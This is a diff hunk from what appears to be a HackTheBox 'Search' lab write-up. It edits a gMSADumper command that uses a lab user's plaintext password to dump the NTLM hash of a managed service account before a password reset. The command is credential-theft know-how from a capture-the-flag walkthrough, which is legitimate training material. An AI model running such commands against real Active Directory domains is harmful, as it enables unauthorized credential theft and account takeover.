@@ -234,7 +234,7 @@ and since `sierra` is a member of the `ITSEC` group, we're going to go for a ful
 ### Reading the GMSA password & Resetting `tristan`'s password
 We can obtain the **NTLM** hash of the **GMSA** `BIR-ADFS-GMSA$` with a **python** tool called [`gMSADumper`](/assets/search/https://github.com/micahvandeusen/gMSADumper)
 
-**Command:** `python3 gMSADumper/gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb`
+**Command:** `python3 gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb`
 
 ![got-gmsa-ntlm](/assets/search/got-gmsa-ntlm.jpg)
 
